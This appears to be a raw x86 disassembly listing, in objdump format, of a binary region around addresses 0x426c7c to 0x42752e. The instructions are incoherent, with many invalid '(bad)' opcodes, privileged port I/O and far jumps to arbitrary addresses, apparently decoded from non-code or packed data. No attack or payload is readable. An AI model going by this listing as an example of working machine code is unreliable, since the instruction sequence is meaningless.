  426c7c:	dec    ebx
  426c7d:	mov    dh,0x74
  426c7f:	test   al,0xd0
  426c81:	ss push esp
  426c83:	and    al,0x9b
  426c85:	ds daa 
  426c87:	pop    eax
  426c88:	pushf  
  426c89:	jmpw   0xa94c
  426c8d:	push   edx
  426c8e:	add    BYTE PTR [edx+0x42c61152],dh
  426c94:	mov    ds:0x83cb,eax
	...
  426d11:	add    BYTE PTR [eax],al
  426d13:	add    BYTE PTR ds:0x55d31474,ah
  426d19:	repz out 0xf6,eax
  426d1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d1d:	adc    bh,BYTE PTR [esi]
  426d1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d20:	ins    DWORD PTR es:[edi],dx
  426d21:	xchg   cl,ah
  426d23:	and    BYTE PTR [esi],0xfe
  426d26:	add    DWORD PTR [eax],eax
  426d28:	imul   eax,DWORD PTR [edi],0x0
  426d2b:	add    BYTE PTR [esi+ebp*1+0xc70512c],cl
  426d32:	loop   0x426daf
  426d34:	inc    eax
  426d35:	mov    WORD PTR [ebx+ecx*8-0x5f],gs
  426d39:	out    dx,al
  426d3a:	sub    eax,0x3616aa02
  426d3f:	int3   
  426d40:	mov    ds:0xfec0864b,eax
  426d45:	mov    edi,0xb47e48e3
  426d4a:	rol    DWORD PTR [ebx-0x69003b56],cl
  426d50:	push   eax
  426d51:	sbb    al,0xce
  426d53:	enter  0xbb76,0xd0
  426d57:	mov    ecx,ds
  426d59:	mov    bl,0xec
  426d5b:	in     al,0x2d
  426d5d:	or     esp,edx
  426d5f:	jns    0x426d53
  426d61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426d62:	pop    ss
  426d63:	cmp    ch,BYTE PTR [ebx-0x23]
  426d66:	rcr    bl,0xcc
  426d69:	pop    eax
  426d6a:	dec    ecx
  426d6b:	test   BYTE PTR [edi],0x3c
  426d6e:	add    edx,ebx
  426d70:	mov    eax,0x1393817b
  426d75:	imul   ecx,eax,0x84029dbf
  426d7b:	pushf  
  426d7c:	clc    
  426d7d:	and    ebp,ebx
  426d7f:	jae    0x426d60
  426d81:	ret    
  426d82:	pop    ds
  426d83:	test   eax,0x3c08c5ee
  426d88:	adc    edi,DWORD PTR [ebx+0x30c4b3b5]
  426d8e:	jne    0x426d95
  426d90:	int    0x52
  426d92:	pcmpeqb mm2,mm6
  426d95:	jmp    0xab0c419a
  426d9a:	cdq    
  426d9b:	ja     0x426d21
  426d9d:	xor    DWORD PTR [edi+0x377ecfe9],esp
  426da3:	and    DWORD PTR [esi],esi
  426da5:	pop    ds
  426da6:	sbb    DWORD PTR [eax],ecx
  426da8:	mov    ecx,0x244a89b5
  426dad:	outs   dx,BYTE PTR ds:[esi]
  426dae:	mov    bl,0x87
  426db0:	int3   
  426db1:	push   esi
  426db2:	loope  0x426dc7
  426db4:	or     BYTE PTR ds:0x4eea06b1,ah
  426dba:	(bad)  
  426dbb:	int3   
  426dbc:	mov    dl,BYTE PTR ds:0xb6f01194
  426dc2:	and    ah,BYTE PTR ds:0x58e4d55
  426dc8:	shl    ah,1
  426dca:	sbb    BYTE PTR [edi-0x537505ec],ah
  426dd0:	xchg   ebx,eax
  426dd1:	push   cs
  426dd2:	add    dl,bh
  426dd4:	push   edx
  426dd5:	lahf   
  426dd6:	xor    al,dl
  426dd8:	adc    dl,BYTE PTR [esi+ecx*2]
  426ddb:	or     bl,BYTE PTR [esi+0x7244f5a0]
  426de1:	aaa    
  426de2:	or     al,0x49
  426de4:	loopne 0x426d68
  426de6:	pop    edx
  426de7:	iret   
  426de8:	jbe    0x426d7e
  426dea:	mov    ds:0xefd3ff9a,al
  426def:	inc    edi
  426df0:	scas   al,BYTE PTR es:[edi]
  426df1:	adc    DWORD PTR [esi],eax
  426df3:	aas    
  426df4:	mov    edx,es
  426df6:	fdiv   DWORD PTR [ebx+0x79]
  426df9:	mov    dl,0x85
  426dfb:	jae    0x426dfc
  426dfd:	adc    bl,cl
  426dff:	ins    DWORD PTR es:[edi],dx
  426e00:	(bad)  
  426e02:	xchg   esp,eax
  426e03:	add    cl,dh
  426e05:	xor    al,0x39
  426e07:	push   esi
  426e08:	in     eax,0xbd
  426e0a:	xor    BYTE PTR [esi],al
  426e0c:	arpl   WORD PTR [esi+ecx*1-0x7f2475e5],bx
  426e13:	call   0x164e:0xfe58e4cd
  426e1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e1b:	pop    ebp
  426e1c:	inc    edi
  426e1d:	dec    ecx
  426e1e:	fdiv   DWORD PTR [eax]
  426e20:	int3   
  426e21:	ja     0x426dbc
  426e23:	test   ecx,0xf59f8730
  426e29:	in     al,0x2d
  426e2b:	mov    dl,0x3a
  426e2d:	jno    0x426df3
  426e2f:	sub    ebp,DWORD PTR [ebx-0x192c6dd8]
  426e35:	xor    al,0xd8
  426e37:	imul   DWORD PTR [eax+0x29f43b63]
  426e3d:	retf   
  426e3e:	adc    DWORD PTR [edi+0x5],edi
  426e41:	dec    edx
  426e42:	iret   
  426e43:	jo     0x426e96
  426e45:	aas    
  426e46:	xor    bh,BYTE PTR [esi]
  426e48:	idiv   DWORD PTR [eax-0x6ff28560]
  426e4e:	sbb    BYTE PTR [ecx],0x19
  426e51:	mov    dh,0xbd
  426e53:	(bad)  
  426e54:	sti    
  426e55:	mov    ds:0xd352a1df,al
  426e5a:	lock aam 0x44
  426e5d:	mov    ds:0xfab27732,al
  426e62:	cli    
  426e63:	dec    ecx
  426e64:	hlt    
  426e65:	sbb    esi,DWORD PTR [eax+ecx*4+0x1]
  426e69:	inc    ebp
  426e6a:	xchg   ebx,eax
  426e6b:	jno    0x426e99
  426e6d:	aad    0x39
  426e6f:	sub    DWORD PTR [ecx+0x3a887d9e],ebp
  426e75:	pop    ecx
  426e76:	xor    BYTE PTR [edi-0x79],dl
  426e79:	scas   al,BYTE PTR es:[edi]
  426e7a:	pop    esi
  426e7b:	mov    dh,0x70
  426e7d:	idiv   BYTE PTR [edx-0x65]
  426e80:	gs jl  0x426e7d
  426e83:	dec    ebx
  426e84:	add    ch,ah
  426e86:	fwait
  426e87:	xchg   edx,eax
  426e88:	(bad)  
  426e89:	test   ch,0x75
  426e8c:	cmp    DWORD PTR [edi],edx
  426e8e:	jge    0x426f01
  426e90:	es and al,0xa6
  426e93:	outs   dx,DWORD PTR ds:[esi]
  426e94:	popa   
  426e95:	or     eax,0x5adc71ea
  426e9a:	dec    esi
  426e9b:	lods   eax,DWORD PTR ds:[esi]
  426e9c:	xor    edi,esi
  426e9e:	inc    eax
  426e9f:	push   edi
  426ea0:	and    ebx,ebp
  426ea2:	cmp    al,0xf5
  426ea4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426ea5:	stc    
  426ea6:	outs   dx,BYTE PTR ds:[esi]
  426ea7:	inc    edi
  426ea8:	repz clc 
  426eaa:	or     BYTE PTR [ebx],ah
  426eac:	mov    dl,0xd7
  426eae:	sub    BYTE PTR [ebp+ecx*8+0x41a0c8dd],ch
  426eb5:	dec    esi
  426eb6:	rcr    BYTE PTR [edi-0x5f],0x8d
  426eba:	and    DWORD PTR [ecx-0x1c],edx
  426ebd:	cmp    BYTE PTR [ecx+edx*2+0x65],cl
  426ec1:	mov    ?,WORD PTR [edx-0x78]
  426ec4:	popa   
  426ec5:	xchg   BYTE PTR [esp+0x1323d8e5],dl
  426ecc:	sahf   
  426ecd:	js     0x426f34
  426ecf:	pushf  
  426ed0:	fiadd  DWORD PTR [eax]
  426ed2:	ja     0x426f02
  426ed4:	(bad)  
  426ed5:	lock gs pop ecx
  426ed8:	add    DWORD PTR [eax+0x4f21b33],edx
  426ede:	arpl   dx,bp
  426ee0:	push   ds
  426ee1:	inc    ebx
  426ee2:	scas   al,BYTE PTR es:[edi]
  426ee3:	out    dx,al
  426ee4:	xor    DWORD PTR [esi-0x6],eax
  426ee7:	les    ebx,FWORD PTR [eax+edi*2]
  426eea:	ficom  DWORD PTR [eax]
  426eec:	dec    esi
  426eed:	loope  0x426ee9
  426eef:	push   DWORD PTR gs:[edx-0x50d68f44]
  426ef6:	jne    0x426f38
  426ef8:	jne    0x426f42
  426efa:	stos   BYTE PTR es:[edi],al
  426efb:	cmp    DWORD PTR [edx+0xbbafe27],ecx
  426f01:	pop    ds
  426f02:	test   esi,0x48130822
  426f08:	jl     0x426e92
  426f0a:	ins    DWORD PTR es:[edi],dx
  426f0b:	jmp    0x6063cf0e
  426f10:	jne    0x426eaa
  426f12:	loope  0x426f12
  426f14:	scas   eax,DWORD PTR es:[edi]
  426f15:	loopne 0x426f50
  426f17:	sahf   
  426f18:	dec    eax
  426f19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f1a:	add    DWORD PTR [eax],ebx
  426f1c:	mov    al,0xcf
  426f1e:	jno    0x426f39
  426f20:	ins    BYTE PTR es:[edi],dx
  426f21:	pop    ecx
  426f22:	out    dx,eax
  426f23:	int3   
  426f24:	pop    ebx
  426f25:	xchg   esi,eax
  426f26:	pop    ds
  426f27:	rcr    BYTE PTR [edx+0x3a6e19e],cl
  426f2d:	sbb    BYTE PTR [ecx+0x9],ah
  426f30:	mov    dl,0xcd
  426f32:	loop   0x426ef4
  426f34:	xor    DWORD PTR fs:[edx+0x7896a57c],0x68efcf0f
  426f3f:	call   0xe069:0xb0df9412
  426f46:	test   eax,0x812a01b7
  426f4b:	inc    esi
  426f4c:	imul   ebp
  426f4e:	dec    ecx
  426f4f:	inc    esp
  426f50:	inc    esp
  426f51:	aaa    
  426f52:	ficomp DWORD PTR [esi-0x1d352e6d]
  426f58:	xor    DWORD PTR [ebx+0x254dc106],0x4fb2ccec
  426f62:	sub    cl,BYTE PTR [esi-0x5e]
  426f65:	jb     0x426fd9
  426f67:	in     al,dx
  426f68:	adc    al,0x33
  426f6a:	pushf  
  426f6b:	call   ebx
  426f6d:	pop    ss
  426f6e:	enter  0x4d44,0xe5
  426f72:	dec    edx
  426f73:	pusha  
  426f74:	outs   dx,BYTE PTR ds:[esi]
  426f75:	enter  0x8fe9,0xc8
  426f79:	mov    DWORD PTR [eax-0x41174837],ebp
  426f7f:	std    
  426f80:	mov    WORD PTR [ebx+eax*1+0x14],?
  426f84:	and    eax,DWORD PTR [edx-0x170f169e]
  426f8a:	ret    0xcb34
  426f8d:	mov    ds:0x17a44e2c,al
  426f92:	dec    ecx
  426f93:	cwde   
  426f94:	sub    BYTE PTR [eax+0x4],0xb0
  426f98:	xchg   BYTE PTR [edi-0x28],al
  426f9b:	stos   DWORD PTR es:[edi],eax
  426f9c:	and    dl,BYTE PTR [edi-0x338a1e4e]
  426fa2:	inc    edi
  426fa3:	daa    
  426fa4:	shl    ch,cl
  426fa6:	aad    0x6a
  426fa8:	and    ebp,edi
  426faa:	mov    esi,0xc438ef93
  426faf:	aaa    
  426fb0:	push   eax
  426fb1:	cdq    
  426fb2:	inc    ecx
  426fb3:	or     bh,ah
  426fb5:	leave  
  426fb6:	ror    DWORD PTR [ecx-0x2d],0x5d
  426fba:	xlat   BYTE PTR ds:[ebx]
  426fbb:	bound  eax,QWORD PTR ds:0xeb351904
  426fc1:	movaps xmm4,XMMWORD PTR [edx-0x34]
  426fc5:	jbe    0x427019
  426fc7:	sbb    al,0x7f
  426fc9:	test   BYTE PTR [eax],0x83
  426fcc:	dec    ebp
  426fcd:	jns    0x426f9a
  426fcf:	push   ebp
  426fd0:	cli    
  426fd1:	cdq    
  426fd2:	enter  0xcd18,0xdd
  426fd6:	jp     0x426f62
  426fd8:	xor    DWORD PTR [ebx+eax*2-0x35],0xe3dd8d52
  426fe0:	out    0x49,al
  426fe2:	pop    esi
  426fe3:	hlt    
  426fe4:	retf   
  426fe5:	gs pop esi
  426fe7:	dec    eax
  426fe8:	jbe    0x426f9f
  426fea:	jo     0x426fe8
  426fec:	call   0xf730b317
  426ff1:	into   
  426ff2:	jmp    0x601d:0x9ebcd162
  426ff9:	dec    ebp
  426ffa:	mov    edx,0xb334311b
  426fff:	and    edx,esi
  427001:	mov    ebp,0x4f9eb2dd
  427006:	dec    edi
  427007:	and    esi,DWORD PTR [esi]
  427009:	loopne 0x427058
  42700b:	jno    0x427051
  42700d:	lods   al,BYTE PTR ds:[esi]
  42700e:	in     eax,0x4a
  427010:	add    al,0xb6
  427012:	mov    al,0xf8
  427014:	nop
  427015:	cmp    al,0x4
  427017:	(bad)  
  427018:	sub    eax,0xef477afa
  42701d:	call   0x8ba1cc03
  427022:	(bad)  
  427023:	jbe    0x426fae
  427025:	sbb    dh,ch
  427027:	and    DWORD PTR [esi],eax
  427029:	jmp    0x427048
  42702b:	fwait
  42702c:	cmc    
  42702d:	sbb    BYTE PTR [ebp+0xc16bbfa],cl
  427033:	pop    ss
  427034:	(bad)  
  427035:	xlat   BYTE PTR ds:[ebx]
  427036:	cmc    
  427037:	mov    dh,0x81
  427039:	int3   
  42703a:	iret   
  42703b:	popf   
  42703c:	mov    bh,0x3a
  42703e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42703f:	jmp    0xa70f409a
  427044:	std    
  427045:	lods   al,BYTE PTR ds:[esi]
  427046:	mov    edx,0x52687fa9
  42704b:	inc    edx
  42704c:	sub    ecx,esp
  42704e:	es cmp edx,ecx
  427051:	cmp    DWORD PTR [edi-0x57],ecx
  427054:	pop    ecx
  427055:	pushf  
  427056:	cs push 0x364ccef9
  42705c:	mov    ds:0x98de0ff4,eax
  427061:	cmp    eax,0xe1e44b8d
  427066:	and    eax,0xedb7bbd6
  42706b:	push   ecx
  42706c:	mov    eax,ds:0xa28f92d7
  427071:	out    dx,al
  427072:	push   es
  427073:	fs inc ecx
  427075:	dec    ebp
  427076:	jno    0x4270dc
  427078:	jne    0x427000
  42707a:	or     esi,DWORD PTR [esi]
  42707c:	or     ch,BYTE PTR [esp+edx*2-0xa05a2b6]
  427083:	mov    esp,0x482f95f7
  427088:	inc    edx
  427089:	cmp    DWORD PTR [eax+0xe],ecx
  42708c:	imul   dl
  42708e:	lds    ebp,FWORD PTR [edi+0x17209e26]
  427094:	shl    BYTE PTR [edx-0x46107d13],1
  42709a:	out    0xb1,al
  42709c:	pop    esi
  42709d:	xchg   cl,dl
  42709f:	mov    esi,0x78ed4be5
  4270a4:	js     0x427029
  4270a6:	sub    BYTE PTR [esi],ch
  4270a8:	and    eax,0xb7ce3f1a
  4270ad:	ss (bad) 
  4270af:	pop    es
  4270b0:	push   ds
  4270b1:	les    ebp,FWORD PTR [edx+0x42d7308b]
  4270b7:	push   es
  4270b8:	mov    ecx,0xc16fae20
  4270bd:	aas    
  4270be:	jp     0x427079
  4270c0:	add    eax,0xa45db64d
  4270c5:	mov    al,ds:0x991c8cb7
  4270ca:	sub    ecx,DWORD PTR [edi]
  4270cc:	xchg   bh,ch
  4270ce:	cwde   
  4270cf:	mov    DWORD PTR [eax+0x16],edx
  4270d2:	sbb    dh,BYTE PTR [edx-0xda9e943]
  4270d8:	xchg   esi,eax
  4270d9:	sub    BYTE PTR [ebp+0x78],bh
  4270dc:	dec    DWORD PTR [ecx+0x2b7aa193]
  4270e2:	xchg   edx,eax
  4270e3:	arpl   WORD PTR [ecx-0x2e],di
  4270e6:	fnstcw WORD PTR [esi-0x6a]
  4270e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4270ea:	jbe    0x4270d9
  4270ec:	xchg   DWORD PTR [edx],edi
  4270ee:	bound  ebp,QWORD PTR [esi]
  4270f0:	loope  0x42709e
  4270f2:	scas   al,BYTE PTR es:[edi]
  4270f3:	ror    dl,0x66
  4270f6:	fs mov esp,0xda91989f
  4270fc:	pushf  
  4270fd:	popf   
  4270fe:	xor    eax,0x58acc0d3
  427103:	xchg   edi,eax
  427104:	jae    0x427105
  427106:	jb     0x4270d4
  427108:	in     al,dx
  427109:	test   al,0xa5
  42710b:	pop    ss
  42710c:	jecxz  0x42711b
  42710e:	pushf  
  42710f:	add    eax,DWORD PTR [edi]
  427111:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427112:	mov    edi,0x9f842d28
  427117:	fisub  DWORD PTR [ebx+0x6]
  42711a:	ja     0x4270c9
  42711c:	sub    ah,BYTE PTR ds:0x3c60bda0
  427122:	aad    0xe2
  427124:	jo     0x427149
  427126:	pusha  
  427127:	push   eax
  427128:	cwde   
  427129:	retf   0x6a68
  42712c:	xchg   edx,eax
  42712d:	mov    cl,0x4f
  42712f:	outs   dx,BYTE PTR ds:[esi]
  427130:	inc    ecx
  427131:	ret    
  427132:	pop    ebx
  427133:	(bad)  
  427134:	repnz fxch st(4)
  427137:	inc    ebp
  427138:	pusha  
  427139:	mov    edx,DWORD PTR [eax-0x4d]
  42713c:	jp     0x42718f
  42713e:	push   ds
  42713f:	adc    BYTE PTR [edx],ah
  427141:	imul   DWORD PTR [esi+ebp*8-0x3bb5cb6c]
  427148:	fiadd  DWORD PTR [eax+0x9]
  42714b:	iret   
  42714c:	(bad)  
  42714d:	stc    
  42714e:	out    dx,al
  42714f:	mov    bh,0x7a
  427151:	or     eax,0x99c45919
  427156:	push   cs
  427157:	jbe    0x427112
  427159:	adc    eax,0xc1f34c3c
  42715e:	loope  0x4271d0
  427160:	jge    0x427174
  427162:	jae    0x4271c4
  427164:	int    0xfe
  427166:	jmp    0x42713f
  427168:	mov    esp,DWORD PTR [eax+0x405b4f60]
  42716e:	xor    al,0xcf
  427170:	(bad)  
  427171:	mov    ebx,0x44cc927b
  427176:	ficom  WORD PTR [edx-0x407bae2b]
  42717c:	dec    ecx
  42717d:	fist   WORD PTR [edx+0x14]
  427180:	dec    edi
  427181:	push   0x3c7170f
  427186:	sahf   
  427187:	fsubr  DWORD PTR ds:0x2462ed21
  42718d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42718e:	mul    DWORD PTR [ebp+ecx*2-0x66]
  427192:	fwait
  427193:	jmp    0x4271d1
  427195:	pop    ecx
  427196:	cmp    al,0x81
  427198:	leave  
  427199:	js     0x42717d
  42719b:	into   
  42719c:	sub    eax,DWORD PTR [ecx]
  42719e:	mov    ah,BYTE PTR [ebx+0x36e1bce]
  4271a4:	cli    
  4271a5:	cmp    BYTE PTR [esi-0x557c0fe7],ah
  4271ab:	jmp    0xa91d:0xfe88054a
  4271b2:	dec    ebp
  4271b3:	push   ebx
  4271b4:	pop    edi
  4271b5:	ret    
  4271b6:	jbe    0x4271de
  4271b8:	pop    esi
  4271b9:	jae    0x42715d
  4271bb:	fcmovbe st,st(5)
  4271bd:	jl     0x42715b
  4271bf:	lods   al,BYTE PTR ds:[esi]
  4271c0:	adc    edx,DWORD PTR [esi+0x23bdb89b]
  4271c6:	test   BYTE PTR [esi-0xac1b476],al
  4271cc:	and    ch,al
  4271ce:	adc    BYTE PTR [ebp-0x37021b83],al
  4271d4:	dec    edx
  4271d5:	xchg   ebp,eax
  4271d6:	dec    ebx
  4271d7:	or     al,0x25
  4271d9:	sub    al,0xa
  4271db:	push   esp
  4271dc:	sti    
  4271dd:	popf   
  4271de:	cmp    bh,BYTE PTR [eax+edx*1-0x2a]
  4271e2:	je     0x42725e
  4271e4:	outs   dx,BYTE PTR ds:[esi]
  4271e5:	fist   DWORD PTR ds:0x8e596ce1
  4271eb:	inc    ecx
  4271ec:	add    al,0xb5
  4271ee:	or     esi,DWORD PTR [esi+0x3f8eb6fa]
  4271f4:	stos   BYTE PTR es:[edi],al
  4271f5:	push   es
  4271f6:	add    BYTE PTR [ecx],bl
  4271f8:	and    al,0x91
  4271fa:	and    edi,ebx
  4271fc:	call   0x8277:0x81223f8a
  427203:	and    esi,DWORD PTR [eax-0x34]
  427206:	div    BYTE PTR [esp+edi*8]
  427209:	ds push esi
  42720b:	rol    DWORD PTR [ebx+ebp*1],cl
  42720e:	sti    
  42720f:	(bad)  
  427210:	lock push ss
  427212:	push   ebp
  427213:	xor    BYTE PTR [edi+0x58daebe7],cl
  427219:	cmp    DWORD PTR [esi+eiz*1],eax
  42721c:	mov    cl,0xe3
  42721e:	or     BYTE PTR [ebx+0x15],ch
  427221:	fwait
  427222:	scas   eax,DWORD PTR es:[edi]
  427223:	sub    DWORD PTR [ebp-0x34],edx
  427226:	mov    cl,ch
  427228:	es loop 0x4271db
  42722b:	fcom   st(6)
  42722d:	inc    ecx
  42722e:	sub    al,0xfa
  427230:	and    DWORD PTR [ecx+0x15],esp
  427233:	push   ebx
  427234:	dec    edi
  427235:	dec    ecx
  427236:	lock add dh,BYTE PTR [edx]
  427239:	loopne 0x427244
  42723b:	and    DWORD PTR [ebx+0x1f2765aa],0xffffffd1
  427242:	pushf  
  427243:	push   edi
  427244:	cld    
  427245:	lahf   
  427246:	push   0xffffffc8
  427248:	(bad)  
  427249:	cld    
  42724a:	mov    dh,0x41
  42724c:	jbe    0x4272c3
  42724e:	mov    ebx,0xc0b4d194
  427253:	add    al,0xdf
  427255:	lock mov al,ds:0x5744abdc
  42725b:	dec    esi
  42725c:	pusha  
  42725d:	mov    BYTE PTR [edi],bh
  42725f:	and    al,0xf3
  427261:	in     al,dx
  427262:	clc    
  427263:	retf   0x100
  427266:	dec    ebp
  427267:	rcr    BYTE PTR ds:0xe80cbbdc,0xaa
  42726e:	fwait
  42726f:	mov    esp,0x5e0e572f
  427274:	fdiv   st(3),st
  427276:	push   cs
  427277:	aad    0xbc
  427279:	and    DWORD PTR [ebx+0xd],ebx
  42727c:	push   esp
  42727d:	push   ss
  42727e:	cmp    eax,0xf337410e
  427283:	mov    esi,0x9da8f7b7
  427288:	inc    esp
  427289:	push   0xfa0de822
  42728e:	retf   0xbccf
  427291:	imul   ebx,DWORD PTR [ebx+0x20],0x1b90cd5d
  427298:	mov    ds:0x33922b0e,eax
  42729d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42729e:	ja     0x4272d2
  4272a0:	inc    ecx
  4272a1:	xchg   edx,eax
  4272a2:	aad    0x49
  4272a4:	pusha  
  4272a5:	xchg   ecx,eax
  4272a6:	jle    0x4272f3
  4272a8:	retf   0x5158
  4272ab:	add    al,0xa4
  4272ad:	(bad)  
  4272af:	outs   dx,DWORD PTR ds:[esi]
  4272b0:	fs add dh,bl
  4272b3:	pop    edi
  4272b4:	xor    cl,BYTE PTR [ebp-0x60]
  4272b7:	fstp   QWORD PTR [edx+0x25]
  4272ba:	lods   al,BYTE PTR ds:[esi]
  4272bb:	inc    esp
  4272bc:	mov    ecx,0xafecee38
  4272c1:	fcomp  QWORD PTR [ecx-0x4d299359]
  4272c7:	outs   dx,DWORD PTR ds:[esi]
  4272c8:	push   cs
  4272c9:	xchg   ebx,eax
  4272ca:	adc    eax,0x42a20b97
  4272cf:	cmp    al,0xdb
  4272d1:	ret    
  4272d2:	add    dh,BYTE PTR [ebx]
  4272d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4272d5:	repz (bad) 
  4272d7:	pop    eax
  4272d8:	push   ecx
  4272d9:	hlt    
  4272da:	sti    
  4272db:	ror    DWORD PTR [edx-0x4b],cl
  4272de:	sub    al,0xa8
  4272e0:	test   eax,0x85d11835
  4272e5:	imul   DWORD PTR [edi-0x562132cc]
  4272eb:	push   0xfffffffb
  4272ed:	rcl    ah,1
  4272ef:	jae    0x4272fc
  4272f1:	xchg   edi,eax
  4272f2:	fadd   QWORD PTR [edi]
  4272f4:	dec    eax
  4272f5:	ror    DWORD PTR [edi+0x50c28d8e],1
  4272fb:	adc    DWORD PTR [ebx-0x40],esi
  4272fe:	js     0x427342
  427300:	xchg   ebp,eax
  427301:	ficomp WORD PTR [ebx+0x67]
  427304:	push   ds
  427305:	pusha  
  427306:	dec    esp
  427307:	cli    
  427308:	cmp    eax,0x194b5bcd
  42730d:	pop    esp
  42730e:	or     edx,0xffffff84
  427311:	ins    BYTE PTR es:[edi],dx
  427312:	push   es
  427313:	and    ah,BYTE PTR ds:0xb5f40863
  427319:	jns    0x4272f3
  42731b:	je     0x427336
  42731d:	and    al,0xc1
  42731f:	push   edi
  427320:	cmp    ch,bl
  427322:	pusha  
  427323:	mov    WORD PTR [eax-0x2c],cs
  427326:	xor    DWORD PTR [edi-0x6952cd90],edx
  42732c:	int    0x23
  42732e:	jmp    0xcfa293c9
  427333:	retf   0xa1e5
  427336:	addr16 adc eax,0x7d704c9d
  42733c:	loop   0x4273a3
  42733e:	adc    eax,0x1ff94cad
  427343:	and    eax,0xbfcbf8d9
  427348:	push   es
  427349:	xchg   ecx,eax
  42734a:	cmc    
  42734b:	jmp    0xa6cc:0x285a04fb
  427352:	fidiv  WORD PTR [ecx+0x7dec193]
  427358:	push   edi
  427359:	shr    BYTE PTR [ebx-0x16768880],cl
  42735f:	jae    0x4273a8
  427361:	xchg   esp,eax
  427362:	arpl   WORD PTR [edi+0x1e],sp
  427365:	fmul   QWORD PTR gs:[esi-0x583b85ac]
  42736c:	xchg   DWORD PTR [eax],ebx
  42736e:	sub    ebp,DWORD PTR [ecx]
  427370:	dec    edi
  427371:	neg    eax
  427373:	nop
  427374:	and    eax,0x3937ef4e
  427379:	inc    ecx
  42737a:	adc    dh,cl
  42737c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42737d:	mov    ds:0x42e47a54,eax
  427382:	imul   esp,eax,0xffffff89
  427385:	shl    edi,cl
  427387:	mov    al,0x9a
  427389:	sbb    esi,DWORD PTR [edx]
  42738b:	pop    es
  42738c:	or     esp,DWORD PTR [ebx+0x3]
  42738f:	pop    edx
  427390:	and    eax,0x31881327
  427395:	call   FWORD PTR [ebp+0x50]
  427398:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427399:	ins    DWORD PTR es:[edi],dx
  42739a:	cmp    ch,BYTE PTR [ebp-0x4be597e1]
  4273a0:	stos   BYTE PTR es:[edi],al
  4273a1:	jl     0x42741f
  4273a3:	in     al,0x12
  4273a5:	sub    eax,DWORD PTR [esi+0x31]
  4273a8:	push   0xdc60d560
  4273ad:	call   0x7380575e
  4273b2:	mov    ds:0xbba7eaf9,al
  4273b7:	xchg   edx,eax
  4273b8:	aas    
  4273b9:	sbb    eax,0xdaa98486
  4273be:	xchg   edx,eax
  4273bf:	dec    edx
  4273c0:	push   cs
  4273c1:	cs inc edx
  4273c3:	int3   
  4273c4:	pop    esp
  4273c5:	repnz daa 
  4273c7:	mov    eax,0xbc8541ea
  4273cc:	(bad)  
  4273cd:	out    0x89,al
  4273cf:	pop    esi
  4273d0:	leave  
  4273d1:	adc    eax,0xc76dff52
  4273d6:	cli    
  4273d7:	jg     0x4273f9
  4273d9:	pop    eax
  4273da:	fwait
  4273db:	xchg   DWORD PTR [edi+0x49],edx
  4273de:	cmp    al,0xd7
  4273e0:	xlat   BYTE PTR ds:[ebx]
  4273e1:	std    
  4273e2:	mov    WORD PTR [esi+eax*4-0x68270dbf],es
  4273e9:	(bad)  
  4273ea:	cmp    bh,bh
  4273ec:	xor    eax,0xea383281
  4273f1:	arpl   WORD PTR [edi-0xc],sp
  4273f4:	mov    esp,0xecf78d2d
  4273f9:	out    dx,al
  4273fa:	dec    esi
  4273fb:	and    al,0x2e
  4273fd:	test   eax,0xdb7fd166
  427402:	mov    ebx,0x2d5806c8
  427407:	idiv   BYTE PTR [edx+0x322d9779]
  42740d:	jnp    0x427488
  42740f:	(bad)  
  427410:	rol    edi,1
  427412:	xor    ebx,DWORD PTR [eax]
  427414:	inc    esp
  427415:	pusha  
  427416:	psrad  mm0,mm1
  427419:	xchg   ebx,eax
  42741a:	push   ebp
  42741b:	push   eax
  42741c:	fdivrp st(0),st
  42741e:	sub    al,0xfd
  427420:	and    DWORD PTR [eax-0x379d9c1f],ebp
  427426:	jno    0x4273dd
  427428:	or     al,0x42
  42742a:	ret    0x7a01
  42742d:	jae    0x42743e
  42742f:	(bad)  
  427430:	(bad)  
  427431:	mov    eax,0x51d9cb
  427436:	je     0x4273ea
  427438:	xor    BYTE PTR [edx],dl
  42743a:	sahf   
  42743b:	mov    cl,0xbe
  42743d:	xchg   ebx,eax
  42743e:	inc    edx
  42743f:	pop    edx
  427440:	in     al,0xd7
  427442:	and    DWORD PTR [ebx-0x77d989bb],edx
  427448:	(bad)  [ebp+0x531b137e]
  42744e:	sbb    cl,BYTE PTR [edx+ecx*2]
  427451:	out    dx,al
  427452:	out    0x28,eax
  427454:	outs   dx,BYTE PTR ds:[esi]
  427455:	(bad)  
  427456:	scas   al,BYTE PTR es:[edi]
  427457:	cmp    dh,dl
  427459:	call   0x85eb:0x85e7a184
  427460:	add    eax,0x9f9977a2
  427465:	pop    edx
  427466:	jmp    0xc305840a
  42746b:	outs   dx,BYTE PTR ds:[esi]
  42746c:	fidivr DWORD PTR [ebx]
  42746e:	dec    esi
  42746f:	pop    DWORD PTR [ebx+0x76]
  427472:	bound  edx,QWORD PTR [edi-0x6f03b067]
  427478:	add    BYTE PTR [ebp-0x31022a04],al
  42747e:	dec    eax
  42747f:	mov    BYTE PTR [ebp+0x24],bh
  427482:	jle    0x427417
  427484:	sahf   
  427485:	xchg   esp,eax
  427486:	fcomi  st,st(3)
  427488:	jmp    0x427492
  42748a:	popa   
  42748b:	pop    ecx
  42748c:	repnz sar cl,cl
  42748f:	or     dl,dl
  427491:	aam    0x74
  427493:	daa    
  427494:	xchg   esi,eax
  427495:	dec    esp
  427496:	int    0x0
	...
  427514:	jbe    0x427541
  427516:	dec    eax
  427517:	jbe    0x427576
  427519:	ja     0x427599
  42751b:	sub    esi,DWORD PTR [ebp-0x4b]
  42751e:	(bad)  
  42751f:	retf   0x29b4
  427522:	in     al,0x79
  427524:	xchg   ecx,eax
  427525:	add    eax,0x80002
  42752a:	add    BYTE PTR [eax],al
  42752c:	repnz pop edx
  42752e:	mov    al,0x45
